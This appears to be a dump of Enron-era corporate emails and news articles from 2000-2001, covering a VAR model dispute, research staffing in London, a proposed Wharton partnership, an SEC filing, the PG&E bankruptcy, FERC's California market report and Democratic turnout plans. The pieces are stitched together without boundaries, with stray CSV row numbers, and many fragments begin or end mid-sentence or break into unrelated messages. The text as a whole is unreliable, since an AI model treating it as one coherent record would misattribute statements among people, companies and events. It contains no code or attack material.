We need IT support in doing this. I asked RAC (Debbie Brackett), IT (Winston, Steve Stock) for this. The reaction 
was not positive. I even guess they assume that I struggle for the ""ownership"" of the code. Our calls to IT guys
are considered as interruptions in their work.
_______________________________________________________________________________________
Var Model:
""Convolution VAR"" (Naveen's approach) is under way. At the end of this month (according to IT) it will more or less work.
It is based on 60 factor model (which I suggested, but which was not implemented for our Monte Carlo model). There
will be no way to perform proper testing of the ""convolution VAR"" even for normal distributions (in this case - Analytical VAR).
There are no plans of such testing, as far as I know.
What will happen is comparison with backtesting for our 5000 portfolios and then endless discussions which portfolios'
VAR numbers are ""better"" or ""worse"" for the new method.

How are you?  Everything is going well here in Boston.  I am staying very busy in school with the core business classes.  I am taking an intro to Finance with Myers which is very good, but otherwise my classes are very fundamental.  I'm finding the most challenging part of business school is juggling all the extracurricular activities.  
Today we kicked off our first official team project which is very similar to the Tiger projects at Wharton that we worked on last spring.  We have a lot of flexibility with the topic of the project.  We are just supposed to find a real company or business unit that will let us analyze a recent, ongoing, or anticipated change initiative.  All that is required is that the initiative be important to the company, represent a change, and have organizational implications.  I don't know if you or a business unit of Enron you know of would like some free consulting in this area, but if so I would love a chance to talk with you about it.    
Another group of us are starting an Energy and Environmental Finance Club this year.  We've collected over $3,000 for the club from about 100 MBA and Manufacturing students, and we will get more from the school.  We would like to bring in speakers from the industry to tell us about new initiatives and the state of the business.  Would you or someone you know be interested in presenting to the club?  The students would really appreciate your involvement.

I am writing to you to confirm my voice-mail message regarding the SEC deposition.
I decided that I don't really  need a counsel to assist me at my deposition before
the Commission. I may retain a lawyer of my own choice to give me general

an opportunity to spend more time with him and learn from his experience. 

You may recall that  I have indicated to you a few weeks ago that my intention was to waive my

He is supported by another member of Mike Roberts' team, Steve Bennett, on a  
temporary assignment (10 days planned originally).  

Action recommended.  

a. Extension of Steve Bennett temporary assignment for a few more weeks. I  
have already authorized extension till the 27th. I shall speak more with 
Tani  
on Wednesday about it. ?b. ?Hiring another weather person to work with Tony  
Hamilton, supporting gas and power across continental Europe. 



2. Stinson Gibner 

Slava is currently in Houston, learning more about research group here and  
building a network of relationships. I have a very high opinion of Salvia -  
he is a very bright person, very personable and hard working. I still worry  
about the depth and breadth of his experience, his understanding of the  
totality of Enron business and the relative ?importance of multiple  
activities we have to support. I think it makes sense to have a more  
experienced research person coaching him for 18-24 months. I talked to Bryan  
Seyfried and Ted Murphy and they expressed similar concerns about the depth  
of support they expect. 

Action recommended. 

I still think it makes sense to bring Stinson Gibner to London for an  
extended stay. To manage Slava's expectations, I would call Stinson a Head 
of  
Research for Europe and Asia. His responsibility would also include  
coordination of research and model building for other locations than London  
where I see a lot of activity that goes on without regular audits and ? 
reviews we have in Houston, and over which we have no control (except for  
reacting to requests for assistance). I propose that Stinson come to London  
in the next few days to discuss the potential assignment with you. 


By the way, Greg Whalley agrees with the idea of a senior research person in  
London. He, however, recommended Vasant - stronger work ethics is the main  
consideration.

I am ready to cover the cost of Steve's trip to Houston (one month in the 
summer).
I think very highly of Steve and think about coaching him a bit to expand his
horizons. I see him as a very valuable asset of Enron and a great leader
in not too distant future. He needs exposure to more diverse business
problems and areas of research. I think it will be in the best interest of 
the company

London may gain more independence from Houston and gain its own book and,

3001,"Mark, this is a good point.  In Moody's June 1999 study, Debt Recoveries for 
Corporate Bankruptcies, there is a graph of Firm-Level Recovery Rates by Year 
of Bankruptcy Resolution (as opposed to default year).   Reading from the 
graph finds:





As the data above is based on resolution year, the same study finds the 
average length of time spent in bankruptcy is 1.30 years (median 1.15 years 
and standard deviation of 1.20 years).  The interesting point is the slide in 
recovery value 1996 to 1998.   One would wonder if the mix of high-yield 
issuance slanted towards the tech companies would yield lower recoveries 
(quick technological obsolescence--little tangible recovery value).  

Interesting to note is the December 1999 to December 2000 change in spreads.  
The table below divides the December 2000 spreads by the December 1999 
spreads.   One would have expected a pronounced flight to safety over this

I am sending you a recommendation regarding our cooperation with the Wharton
School, following my visit with Tom Piazze in May. Tom is a Corporate 
Relations Officer
at Wharton.

Recommendation.

I am writing to you to recommend joining The Wharton Partnership.
The Partnership is an umbrella program established to coordinate
Wharton School initiatives for industry-academic cooperation. Currently,
the partnership supports alliances with approximately  200 companies 
worldwide.

The recommended annual contribution by Enron is between $100K-150K,
that puts us in the top bracket of contributing companies, such as GE, 
Citigroup,
Goldman, Sachs & Co., Intel, and many others.  The contribution is executed 
through
grants to different research projects that would directly benefit Enron. The 
choice
of the projects is at our discretion and can be changed over time
depending on the business needs.

Benefits to Enron. 

Enron can benefit from the Partnership by:

 - gaining advance access to current academic research  
 - significantly increasing our presence  and visibility on the campus,
   enhancing   our recruiting efforts
 - taking our message directly to influential academics who have significant
                   influence on public opinion
        - gaining access to high quality executive education programs

Specific Programs.

The Partnership functions through involvement in different research projects. 
I have
identified a few projects that will maximize the benefit to Enron.

1. WeBI (Wharton e-Business Initiative). This programs provides an umbrella
    for different initiatives in the area of curriculum development, research 
and 
    corporate engagement related to e-commerce.

    Main benefits: access to e-commerce research and
    enhanced recruitment opportunities.

2. Emerging Technologies Management Research Program. Interdisciplinary
    program addressing issues facing companies in new markets: managing 
intellectual
    property, participating in emerging technologies, selecting the optimal
    organizational structures.

    Benefits to Enron: access to financial technology in the area of 
valuation of
    intangible assets and new forms of business organizations.

3. Risk Management and Decision Process Center. Development of techniques for
    assessment and management of non-traditional risks (risks outside the 
scope
    of traditional insurance contracts and capital markets instruments). 

    Benefits to Enron: access to new risk management tools, dissemination
    of information about our capabilities in this area.

Potential users of the program at Enron.

My group could coordinate the cooperation with the Risk Management and 
Decision Process Center.

Greg Whalley is a potential customer for WeBI. Several different units of 
Enron can be involved 
with  Emerging Technologies Management Research Program.

3038,"As a follow-up to my voice mail, attached is a copy of the one page Overview 
that I forwarded to Mark Palmer, Mark Koenig, Mark Metts and Mitch Taylor 
providing an overview of the Application that we are planning on filing with 
the SEC tomorrow.  The attachment is in Power Point.

Because the Application will be filed via Edgar, it will be publicly 
available and thus the reason for alerting Mark Palmer and Mark Koenig.

Joe Sutton approved the filing yesterday, and I am waiting to hear back from 
Jim Derrick that  Ken Lay and Jeff Skilling have approved making the filing.  
As soon as I get a ""green light,"" I will make the filing.

Mark Metts and Mitch Taylor will use the Overview to orally brief Sierra 
Pacific.  The important point for Sierra Pacific is that the Application is 
being made by Enron for legitimate business purposes unrelated to the PGE 
sale, and will not affect the PGE application.  In this regard, we have 
expressly indicated in the Application that the PGE application should take 
priority and not delay the PGE transaction, and we will visit with SEC Staff 
to confirm this treatment.  In any event, the SEC would request us to 
identify which application should take priority, and given the fact that the 
Application would become moot following a sale of PGE (and at which time we 
would withdraw the Application), the SEC should concur.

Please call me if you have any questions.  I also previously prepared a 
longer presentation for other members of our management and can provide this 
to you if you need further information.

firm, clear and polite.  I am sorry that perhaps the most critical aspect of 
your efforts -- security-- has been so confused by our end.  I understand 
from John Brindle that the confusion generated by our end has not kept you 
from accomplishing a great deal of the work anyway.  I have asked John to 
lead the effort, to the extent you need him.  John and his team are very 
experienced and have been in contact with and coordination with the London 
office.  Mike Hicks is a good hand, but for the most part, all I have asked 
him to do is be in a position to identify outside resources skilled in the 
area in question.  It is a bit too much to ask Mike to be hands on for all of 
Enron's corporate security needs.  A little background I'll bore you with:  
after Andre Legallo (formerly VP of Security for Enron) left, we did not 
replace his function.  Most of the operating companies had their own security 
and business controls groups.  When Andre left, we reduced the corporate 
function to a ""default provider"" role -- if a business unit had a need it was 
not otherwise meeting, Mike Hicks (as well as an outside consulting firm) 
would help identify competent resources in the area.  With the reorganization 
of EBS, I have inherited the very competent and experienced team they had 
assembled (led by John Brindle).  John identified some concerns regarding 
India mid last week.  I urged him to get in touch with Rebecca; he did.  It 
was clear after further inquiries by John that the India team had already 
addressed many if not all of the concerns and much of the remaining work 
involved implementation.  John volunteered to send some people over to help 
and I said OK.  He had already been in touch with the London team and Mike 
Hicks (who I have asked to return to Houston).

The last thing you need right now is confusion caused by a group saying 
""we're from corporate and we're here to help"".  If you don't need any ""help"" 
or if the situation gets anything other than significantly better, let me 
know.

PG&E Bankruptcy Will Not Affect Calpine's Commitment to California

Power Market

SAN JOSE, Calif., April 9 /PRNewswire/ -- In response to Pacific Gas and
Electric Company's (PG&E) April 6th Chapter 11 filing, Calpine Corporation
(NYSE: CPN), the San Jose, Calif.-based independent power company, stated it
is confident that PG&E, through a successful reorganization, will be able to
pay Calpine's Qualifying Facility (QF) subsidiaries for all past due power
sales, in addition to electricity deliveries made on a going-forward basis.

CALPINE'S QF SUBSIDIARIES SELL POWER TO PG&E UNDER THE TERMS OF LONG-TERM
QF CONTRACTS AT ELEVEN FACILITIES, REPRESENTING NEARLY 600 MEGAWATTS OF
ELECTRICITY FOR NORTHERN CALIFORNIA POWER CUSTOMERS.  AS OF MARCH 31, 2001,
CALPINE HAS RECORDED APPROXIMATELY $267 MILLION IN ACCOUNTS RECEIVABLE WITH
PG&E, PLUS A $68 MILLION NOTE RECEIVABLE NOT YET DUE AND PAYABLE.  THE
COMPANY'S REMAINING CALIFORNIA OPERATIONS, TOTALING APPROXIMATELY 700 
MEGAWATTS OF CAPACITY, PROVIDE ELECTRICITY TO MUNICIPALITIES AND OTHER 
CREDITWORTHY THIRD PARTIES.

CALPINE'S QF FACILITIES ARE PART OF A 9,000-MEGAWATT QF SUPPLY THAT
PROVIDE CALIFORNIA CUSTOMERS WITH A LONG-TERM SOURCE OF ELECTRICITY AT PRICES
SIGNIFICANTLY BELOW CURRENT WHOLESALE PRICES.  THIS CRITICAL POWER SUPPLY
REPRESENTS APPROXIMATELY 33 PERCENT OF THE STATE'S POWER DEMAND.  WITHOUT
THESE CONTRACTS IN PLACE FOR THIS SUMMER, CALIFORNIA FACES THE PROSPECT OF
MORE BLACKOUTS AND HUNDREDS OF MILLIONS OF DOLLARS IN INCREASED COSTS.

FOR THESE QF CONTRACTS TO CONTINUE, PG&E MUST ASSUME THE CONTRACTS IN THE
BANKRUPTCY PROCEEDINGS.  IN ORDER TO ASSUME THESE CONTRACTS, PG&E WILL BE
REQUIRED TO CURE ALL OUTSTANDING DEFAULTS, INCLUDING PAYING ALL PAST DUE
AMOUNTS.  IF PG&E FAILS TO ASSUME THE CONTRACTS, CALPINE'S QF SUBSIDIARIES
WILL BE ABLE TO SELL POWER ON THE OPEN MARKET AND SEEK DAMAGES FROM PG&E FOR
BREACH OF CONTRACT THROUGH THE BANKRUPTCY CLAIMS RESOLUTION PROCESS.

filing on Monday--more stellar leadership from the administration.
Biggest news is that the Governor is now frantically trying to cobble 
together a Tx buy-out deal with Edison & Sempra; but note that Burton in this 
story questions whether it makes sense to buy Tx if PG&E isn't part of the 
deal.
The first hearing on the bankruptcy is today.

Governor, Utility In War Of Words 
Davis furious as PG&E defends bankruptcy filing

N223519.DTL 
California's energy mess took an ugly turn yesterday as Gov. Gray Davis and 
Pacific Gas and Electric Co. traded barbs over who is to blame for the 
bankruptcy of the state's largest utility. 
In a series of tit-for-tat statements, each side laid claim to the moral high 
ground while insisting that the other had been dealing in bad faith. 
The governor spent part of his time yesterday giving television interviews in 
response to The Chronicle's report Saturday that PG&E awarded $50 million in 
bonuses and raises to 6,000 employees just hours before Friday's bankruptcy 
filing. 
""PG&E's management is suffering from two afflictions: denial and greed,"" 
Davis said in a brief statement Saturday night. 
In a testy reply, PG&E countered that ""instead of focusing all his attention 
on solving the state's yearlong and ever-worsening energy crisis, the 
governor has launched a campaign-style attack on our company."" 
PG&E said Davis was criticizing ""thousands of men and women who have worked 
tirelessly and professionally through this crisis"" and concluded that 
""California would be far better served if the governor turned his attention 
to the crisis at hand."" 
Steve Maviglio, a spokesman for the governor, fired back yesterday: ""PG&E 
waged a public relations war on Friday. If they're looking for somebody to 
blame, they should look in the mirror."" 
Maviglio also said the governor was concentrating on reaching a final accord 
with Southern California Edison Co. for the state to purchase the cash- 
strapped company's power lines for nearly $2.8 billion. 
A last round of talks was scheduled to be held last night. 
""There are a few remaining details to be worked out, but it seems pretty 
close,"" Maviglio said, adding that an announcement of the deal could come as 
early as today. 
""The governor is spending his time negotiating with a responsible utility,"" 
he said. 
Along with the Edison deal, Davis spent the weekend huddling with energy 
advisers and lawyers trying to come up with an appropriate response to PG&E's 
bankruptcy bombshell. 
Efforts to stabilize California's dysfunctional electricity market suddenly 
have become much more complex. 
NOT MUCH CHANGED
Nevertheless, while PG&E's bankruptcy is by far the most sensational aspect 
of California's long-drawn-out energy mess, at the end of the day, it doesn't 
really change a thing. 
Consider: 
-- PG&E's financial woes stem from a rate freeze that prevented the utility 
from passing along to customers runaway wholesale power costs. That rate 
freeze and sky-high electricity prices remain in place. 
-- California's energy shortage is primarily the result of the state not 
having built any major power plants for the past 12 years. PG&E's bankruptcy 
does nothing to affect that precarious situation. 
-- PG&E's foray into bankruptcy court does not alter the fact that 
electricity demand is outpacing available supply. California consumers still 
face a threat of daily blackouts when power usage spikes this summer. 
""The crux of the problem is still the same,"" said Loretta Lynch, president of 
the state Public Utilities Commission. ""We face the same challenges we did 
before PG&E filed for bankruptcy."" 
She added, however, that PG&E's bankruptcy ""increases the uncertainty."" 
The utility doesn't see it that way. 
PG&E spokesman Ron Low said California's energy woes are no more uncertain 
now than they were when the company ostensibly was negotiating with Davis to 
find an equitable solution to the state's troubles. 
""California remains in an energy crisis,"" he said. ""As we head toward summer, 
resources are going to be very tight."" 
WHAT COULD HAPPEN
In the short run, consumers will notice no change whatsoever. Bankruptcy 
protection will allow PG&E to continue operating as usual while the company's 
creditors line up to receive at least partial payment of outstanding bills. 
Longer term, there is a very real possibility that electricity rates will 
soar if the bankruptcy judge agrees with PG&E that conditions for lifting the 
rate freeze were met a year ago and that $9 billion in subsequent expenses 
must be borne by consumers. 
How much people's bills would rise depends on how the rate increase is 
structured. It would probably come in the form of a surcharge on existing 
fees, 
but the monthly hit to consumers could be limited by spreading the total cost 
over a number of years. 
The big question mark now is how PG&E's bankruptcy will affect various 
political and legislative measures intended to keep California's lights on. 
The state's attempt to purchase PG&E's power lines is obviously finished, 
although a new deal could be negotiated in bankruptcy court. 
Meanwhile, the governor is pressing ahead with plans to purchase the 
transmission systems of Edison and Sempra Energy's San Diego utility -- 
although what the state would do with only a partial power grid has yet to be 
determined. 
""Does it make any sense to have the transmission lines of Edison and Sempra 
and not PG&E?"" asked state Senate President Pro Tem John Burton, D-San 
Francisco. ""I don't know the answer to that."" 
A final accord with Edison this week would validate PG&E's apparent concerns 
that it would have had a harder time limiting backlash to its bankruptcy 
filing if the utility had acted after a breakthrough with Edison was 
unveiled. 
The Chronicle quoted PG&E insiders yesterday as saying that the decision to 
file for bankruptcy had been made early last week, even though senior company 
officials said the move followed the governor's Thursday night speech on 
solving California's energy issues. 
One reason PG&E opted to file on Friday morning was because a final deal with 
Edison was expected at any time, observers said. 
Paul Patterson, an analyst at Credit Suisse First Boston, noted that if PG&E 
had filed for bankruptcy after Edison came to terms with the state, ""they 
would be seen as a spoiler."" 
ENSUING CONFUSION
In any case, PG&E's surprise filing has left all concerned scrambling for 
footing in the changed political landscape. 
Consumer advocates watched with dismay yesterday as the state's political and 
corporate powers slugged it out for supremacy. 
Nettie Hoge, executive director of The Utility Reform Network in San 
Francisco, said all this finger-pointing will do nothing to ensure that 
Californians have ample supplies of electricity this summer. 
""These guys should grow up and come up with a situation that works for the 
public,"" she said.

USA: US FERC probe finds no Calif. market abuse by utilities.

11/01/2000
Reuters English News Service
(C) Reuters Limited 2000.

WASHINGTON, Nov 1 (Reuters) - The Federal Energy Regulatory Commission on 
Wednesday said in a report that California utilities were not necessarily to 
blame for last summer's price rises, which led to an unravelling of the 
state's move to deregulate retail power markets. 
A FERC staff investigation, which was to be released in full later on 
Wednesday, found California's market structure and rules ""flawed,"" which 
combined with tight supplies caused the price of electricity to rise to 
record highs in both wholesale and retail markets.
FERC has proposed rule changes to fix the operations of the California 
Independent System Operator (ISO) and Power Exchange (PX). The draft changes 
would eliminate the need for Pacific Gas and Electric, San Diego Gas and 
Electric and SoCal Edison from having to sell into or buy from the power 
exchange. 
Other highlights from the proposal include establihshing an independent, 
non-stakeholder to oversee the ISO and PX; modifying the auction market; new 
reporting requirements; and accelerating new siting of power generation 
facilities and eliminating some environmental impediments to new plants. 
If approved by the full commission at its Wednesday meeting, the changes 
would become effective in 60 days. California regulators and industry 
officials have until Nov. 22 to comment on FERC's proposed changes.

WASHINGTON -(Dow Jones)- The U.S. Federal Energy Regulatory Commission 
Wednesday proposed sweeping structural changes for California's 
problem-plague power market. 
The commission proposed the changes in response to a staff investigation 
report, unveiled Wednesday, which found no ""smoking gun"" evidence that power 
sellers in the state had manipulated market prices to financial benefit.
Instead, FERC blamed the state's mandated market structure for the 
electricity supply shortages and spiking wholesale power prices passed on to 
retail customers in San Diego. 
At the same time, utilities elsewhere in the state hemorrhaged hundreds of 
millions of dollars due to a state-mandated rate freeze that required them to 
sell power at below cost.

The fate of California's rocky experiment in electricity deregulation hangs 
in the balance today as federal regulators meet to decide whether to 
intercede in the state's dysfunctional $23-billion energy market or to let 
free-market forces continue to wreak havoc. 
The four-member Federal Energy Regulatory Commission will release a 
long-awaited staff report analyzing the root causes of California's energy 
crisis and, more important, issue a draft order or action plan on how to 
solve the problems of runaway wholesale electricity costs.
During public hearings in San Diego in September, FERC Chairman James J. 
Hoecker promised that the commission would take action and ""do whatever it 
takes"" to repair California's electricity market, whose deregulation was set 
in motion by landmark state legislation in September 1996. 
Just what the report and order will say remained a matter of intense 
speculation on the eve of their release. The FERC commissioners could impose 
new price caps or order an overhaul of the California Power Exchange and the 
Independent System Operator, the state agencies that conduct daily auctions 
for electricity. The commissioners may ask the state to undertake new 
initiatives to foster more competition in a retail power market still 
dominated by the three big investor-owned utilities. 
But an indictment of power generation companies--which some in the state 
accuse of ""gaming,"" or manipulating the system to wield unfair ""market power"" 
and wringing excessive profits from customers--is unlikely, according to 
published reports and state industry principals and government officials. 
The FERC commissioners are said to blame market deficiencies and defects in 
California for a supply-demand imbalance that sent wholesale electricity 
prices skyrocketing in July to an average of 12.9 cents a kilowatt-hour, more 
than triple the July 1999 average of 3.9 cents. A typical residential 
customer of San Diego Gas & Electric, the first state utility to fully 
deregulate, saw his or her bills triple before state legislators stepped in 
to cap retail rates in August. 
Just as worrisome to many observers is that wholesale electricity rates 
remain sky-high today, even after the end of peak summer power demand. 
Wholesale rates in October averaged about 10 cents a kilowatt-hour, double 
the average cost a year ago, said Patrick Dorinson, a spokesman for the 
Independent System Operator. 
In any case, billions of dollars of investments as well as the political 
careers of prominent California politicians could be affected by what FERC 
does. U.S. Energy Secretary Bill Richardson is coming out from Washington to 
hold a news conference with Gov. Gray Davis in Sacramento this morning to 
announce new, unspecified initiatives to address California's electricity 
problems. 
The Davis administration has gone on record demanding that FERC, which 
oversees the transmission and wholesale selling of electricity around the 
country, to step in and discharge its legal duty to restore ""just and fair"" 
electricity rates in California. The ballooning of electricity rates in San 
Diego during the summer created a political firestorm that raged unabated 
until the state Legislature imposed its caps. 
Rates paid by retail customers in the Southern California Edison and Pacific 
Gas & Electric coverage areas are frozen as well for the time being. But $5 
billion in ""undercollections""--the difference between what the investor-owned 
utilities have paid for wholesale electricity this year and what they can 
charge consumers--looms overhead, worrying Wall Street. 
""I have no idea what the FERC will say,"" said state Public Utilities 
Commission President Loretta Lynch, a Davis appointee who says she is as much 
in suspense as anyone. ""But we are expecting a substantial order that would 
move the ball forward on repairing the wholesale market in California."" 
Consumer advocates and the state's major utilities would like to see FERC 
impose some sort of wholesale price controls--even gut the Power Exchange and 
the Independent System Operator because they are clearly not working as 
intended. 
""We expect some radical surgery,"" said Doug Kline, spokesman for Sempra 
Energy, the parent of San Diego Gas & Electric. 
Some consumer groups would like to see FERC declare the wholesale rates 
collected by generators ""unjust and unreasonable,"" legal code words that 
would open the gates to actions by the PUC or the Legislature to force the 
power companies to disgorge or refund excessive profit. Such an action, which 
would lead to litigation by the power companies, is considered unlikely. 
Business interests, including the power generators that have reaped enormous 
profit from the dysfunctional market, are arguing to let free-market forces 
prevail because restrictive price caps would abort the market's evolution and 
possibly stifle construction of new power plants, which offer the best 
long-term solution to the state's predicament. 
""We expect that the FERC will find that the high prices of this past summer 
are a result of supply-and-demand imbalance and market design defects on the 
retail and wholesale side, but that the market participants have been playing 
within the rules and that there has been no manipulation or gaming,"" said 
Brent Bailey, general counsel of Duke Energy North America of Houston, a 
major generation player in the California market. 
Duke and others also strenuously oppose a solution proposed by the state's 
municipal utilities, notably the Los Angeles Department of Water and Power: 
that the industry in essence be re-regulated by imposing a system of 
cost-based rate controls, similar to how electricity rates were set before 
deregulation. 
Such a move would lead to lawsuits filed by Duke and other power merchants 
alleging ""confiscatory"" actions by the state nullifying the value of hundreds 
of millions of dollars they have invested in California power plants. Bailey 
favors temporary price caps until the market regains its balance, as well as 
new tweaking of the power market to stir up competition. 
Los Angeles DWP General Manager S. David Freeman, who has led calls for 
temporary imposition of cost-based rates, said California's failed 
deregulation experiment raises the possibility that electricity is 
intrinsically an ""un-deregulatable"" service. 
""Three years ago, I thought it would work. Then we had a train wreck,"" he 
said. ""I'm not committing heresy when I say that I think it may not work out.""

3062,"We had a meeting at Wilmer Cutler's office today to discuss the reply brief 
(due on July 2).  Attached is the first draft of the brief -- a redraft will 
be circulated COB Wednesday which will revise this brief somewhat but not 
significantly.  I will circulate the revised brief once I receive it.  Wilmer 
asks that we get comments back to them by Noon on Friday.  

Lou feels very good about New York being defeated in its petition.  Almost 
all of the intervenor briefs have been against New York, and Lou thinks he 
can almost promise that the Court will not rule in favor of New York.

With regard to Enron's position, Lou feels that we have the upper hand 
legally but he is concerned that our position lacks passion -- a reason why 
the Court should rule against the regulator.  We talked about ways to augment 
the reply brief to show the court why it must overturn FERC on the bundled 
retail transmission issue.  

At the end of the meeting, I asked Lou to give us his best guess at our odds 
of prevailing.  Very informally, and somewhat in jest, Lou gives us a 37.5 
percent chance of winning the bundled transmission argument.  John, another 
attorney at Wilmer working on the brief, gives us a 42 percent chance of 
prevailing.  Although these are non-binding, informal estimates, I thought 
everyone would like to hear the odds our Supreme Court council are giving us.

Please let me know if you have any comments on the brief by noon on Friday.

Thanks

analysis of regulatory transfer restriction issues in the above-referenced 
project, I wanted to give each of you a brief update, but more importantly, 
ask for your help in ensuring, as we move closer to the signing date, that we 
are fully coordinated on these issues and are prepared to act in a consistent 
and coordinated fashion across the regions as quickly as possible.

Over the last several weeks, the regional general counsel offices, V&E (Bill 
Weiland), Skadden and myself have been talking to local counsel across the 
regions to make sure that we fully understand all of the regulatory transfer 
issues and that we also fully understand the implications of the regulatory 
transfer restrictions in the context of the ""ABC"" deal structure.  We have 
now largely completed that process and the conclusions reached during that 
process have been memorialized in various documents, including the ""ABC 
Matrix"" that many, if not all of you, have seen.  All that is remaining is 
confirmation on a South Korean competition agency issue and the completion of 
the analysis relative to the Wind assets in Europe regarding EU competition 
agency issues. Those two items should be completed by early next week.  We 
have also recently begun the process of preparing documents that will be 
necessary for the approval of the transfer of Elektro in Brazil...which 
brings me to the second issue, coordination and preparation.

Having reached a critical juncture with the completition of virtually all of 
the regulatory analysis, the next step is to plan for the announcement of the 
transaction...more specifically, ensuring that regulatory/governmental 
communication assignments for both pre and post announcement are fully agreed 
upon and understood by all... and that the process of drafting the necessary 
requests for regulatory approval documents is agreed upon and begun as soon 
as possible.  To ensure that this all happens in a timely manner and with 
quality, I would like to request that one individual from each operating 
region and company be assigned as the point person so that I can have a 
single individual within each operating unit to go to that has the authority 
to put together the comprehensive regulatory transfer plan and the 
responsibility for assuring the execution of the plan, both during the 
periods of time leading up to signing and announcement and during the 
transition period leading up to closing.  I would respectfully ask that the 
names of these individuals be communicated to me by close of business 
Wednesday, August 16, 2000 to provide us sufficient time to address the work 
that lies before us.  I have taken the liberty of listing my suggestions for 
the responsible individuals (where I have suggestions) for the respective 
operating regions/companies, but these are only suggestions and I will defer 
to your choices.  Thank you for your assistance and if you have any 
questions, feel free to contact me at extension 33407 in Houston or by pager

Democrats Tuning Up for Turnout
By David S. Broder
Washington Post Staff Writer
Monday, August 21, 2000; Page A01
LOS ANGELES -- Now that the hoopla of the Democratic National Convention is
past, it's time for Michael Whouley and his team to go to work.
Whouley is the Gore campaign consultant supervising the Democratic Party's
ground war--the man in charge of identifying voters who are likely to
support the vice president and other Democratic candidates and getting them
to the polls on Election Day.
With Democrats hoping for--and anticipating--a close battle for the White
House and both houses of Congress, the margin of victory could, they
believe, turn on the turnout operations run by the ""coordinated campaign""
teams Whouley and his partners have been recruiting in the last few weeks.
As if there were not enough motivation in arming for battle at every level
from the legislatures up, the Republicans have raised the stakes by
announcing two weeks ago that they will funnel most of a $100 million
""Victory 2000 Fund"" through their national and state parties into a similar
operation, targeted on ticket-splitters and weak partisans.
Democratic officials are not certain how seriously to take the threat and
are skeptical Republicans can match them in manpower--even if they spend
much more on the ground war than they have in the past.
But as Democratic National Committee Chairman Joe Andrew said, ""Since we
don't know what the test will be, we are presuming it will be the toughest.""
The job of getting people to the polls is harder than ever for both parties,
because of the shortage of high-intensity issues in a time of general
prosperity and the growing public cynicism about politics and elections. But
Republicans have an easier task. For months, more than 90 percent of their
self-identified partisans have been telling pollsters they support Texas
Gov. George W. Bush.
With those ""base"" voters highly motivated by the prospect of recapturing the
White House, Republicans plan to pour their resources into swing suburban
areas, find out which ticket-splitters are leaning to Bush, and deluge them
with mail and phone calls supporting the entire Republican ticket.
The counterpart Democratic effort or ""coordinated campaign"" will, according
to Andrew and Whouley, focus more on turning out the urban ""base"" of the
party, with a secondary push in selected ticket-splitting suburbs, in
districts and states where key House and Senate races are likely to be
decided.
Democrats have more experience than Republicans in running these turnout
efforts for their whole ticket. They have been using this model since 1988,
when the late Paul Tully, working at the DNC, convinced statewide candidates
and the unions supporting them in several key states that, rather than
working individually, they should pool funds and hire staff to register and
mobilize voters for all their races.
The Democrats have been expanding and improving their operation in every
cycle since then, and turnout programs employing targeted mailings, phone
calls and literature distribution, as well as ""soft money""-financed ""issue
ads,"" all aimed at African American voters, are credited with powering 1998
upset victories, especially in gubernatorial races in Alabama, Georgia and
South Carolina.
But this year, they face special challenges in the black and Latino
constituencies, and there is some nervousness about the pace of preparations
for the battle ahead.
New Jersey Sen. Robert G. Torricelli, chairman of the Democratic Senatorial
Campaign Committee, said: ""The coordinated campaign is late starting this
year. In 1996, we did a good ad program for our base during the summer, and
I haven't seen anything like it so far.""
Others, including some labor officials who have been critical in the past of
the youth and inexperience of the coordinated campaign directors dispatched
from Washington to the states, say that this year the DNC has a seasoned
corps of people heading the field operations.
The three top DNC staffers for the coordinated campaigns, Laurie Moskowitz,
John Giesser and Fred Humphreys, all were working states in 1988, when Tully
began setting up the model.
Andrew began prodding states to develop their game plans for this fall as
soon as he became party chairman in March 1999, having been convinced of the
value of direct voter contact during his previous job as Indiana Democratic
chairman.
With Democrats and Republicans tied in the Indiana state House going into
the 1998 election, Andrew targeted 15 districts for intensive voter contact
work and won 10 of them, giving the Democrats control.
With that experience as his talking point, Andrew has persuaded all 50 state
parties to submit their own coordinated campaign plans and budgets. At the
end of last week, 42 states had their coordinators chosen--if not always in
place.
Democrats declined to disclose their budget, but Andrew said they will be
outspent ""at least 2 to 1"" if Republicans actually put $100 million into
Victory 2000, as they have advertised.
But Andrew's figure does not include what labor unions supporting Gore and
other Democrats spend from their own treasuries mobilizing members and their
families. And it is that union effort which Republicans say is their biggest
worry.
After spending millions on issue ads in the 1996 campaign, AFL-CIO President
John Sweeney decided to switch those resources to a voter contact program,
with dramatic results. The union household share of the actual electorate
rose from 14 percent in 1994 to 23 percent in 1998, according to exit polls.
Surveys taken for the AFL-CIO found that 76 percent of the workers who
remembered receiving a flyer from their union supported the endorsed
candidates; those who had a conversation about the election with a union
volunteer at the workplace or on the doorstep were 81 percent in support of
the union choices.
With control of the House as important a target as Gore's victory, the
AFL-CIO has mobilized 5,000 ""local coordinators"" in 71 targeted
congressional districts. Unions that are part of the labor federation now
are dispatching staff members to coordinate the coordinators.
Sweeney, for one, argues that ""without the machinery and the people we can
deploy, the Republicans' talk of a $100 million ground campaign is really
just a public relations ploy.""
That may or may not prove to be true. Meanwhile, there were some complaints
at the convention from African American and Latino elected officials and
organizers about the planning--or lack of planning--for turnout programs in
their communities. One key California labor official, for example, charged
that a half-million-dollar program targeted on Latino voters had been
canceled after Tony Coelho, a former California congressman, left his post
as chairman of the Gore campaign.
Despite the static, Democrats are clearly serious about trying to win the
ground war. Detroit Mayor Dennis Archer, a central figure in the national
network of Democratic mayors whose political organizations will be competing
with those of the Republican governors in their states, said, ""Winning this
election is not just Al Gore's job. We're taking the responsibility on
ourselves to get the message out about the stark differences between the
parties this year.""
And then he noted, with a smile, ""You know, the Auto Workers' new contract
makes Election Day a holiday for their members. Just watch 'em vote.""

interested in meeting with Richardson and also serving on the panel.  He was 
surprised by  Enron's concern that things were getting bogged down because 
his impression was that progress was being made.  He also had no problem with 
either NERC or GISB participation and felt that NERC has been fairly 
sympathetic to NASUCA.  With respect to some of the consumer issues, there is 
a fear that a national standard will weaken gains made in individual states 
that are more progressive than the national standard might be.  Finally, he 
suggested that a list be made of the technical versus policy (Consumer) 
issues so that we can at least try and move on the technical issues.  I 
suggested that I would have you call to clarify the details on the issues 
that Enron believes are not being addressed fast enough.  Overall, I would 
characterize Larry as very supportive of getting things done quickly, but 
concerned about protecting the consumer interests in the process.  (Right of

3081,"Gentlemen:

Enron is exploring the possibility of becoming involved in a research 
endeavor called the New Economy Value Research Lab. The Lab is the result of 
a joint effort between MIT's Sloan School of Management and Arthur Andersen 
(AA). Its purpose is to develop ""quantitative valuations of the intangible 
assets Wall Street finds increasingly important in the New Economy"" (Business 
Week, 2/7/00). Clearly, as Enron continues to shift from a hard asset to 
